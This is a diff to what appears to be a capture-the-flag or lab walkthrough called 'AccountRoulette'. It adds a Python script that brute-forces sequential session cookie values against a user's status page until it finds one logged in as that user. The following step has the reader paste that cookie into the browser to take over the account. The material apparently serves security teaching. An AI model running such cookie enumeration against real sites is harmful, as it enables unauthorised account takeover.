@@ -6,6 +6,23 @@ We have logged in as a random test user that we created and have gone to an old 
 ## Steps
 1. Write Python code
 
+```python
+import requests, re
+
+url = "https://wespeektogether.com/thedazman/status/74635478354"
+
+cookie_value = 0
+while True:
+    request = requests.get(url, cookies = {"speek_sess_id": str(cookie_value)})
+    match = re.search("Logged in as thedazman", request.text)
+
+    if match:
+        print(cookie_value)
+        break
+
+    cookie_value += 1
+```
+
 ![python to cookie login](/assets/screenshots/hq-12-AccountRoulette/step-1.png)
 
 2. Copy the number in the output and go into *Cookies* using *Inspect*
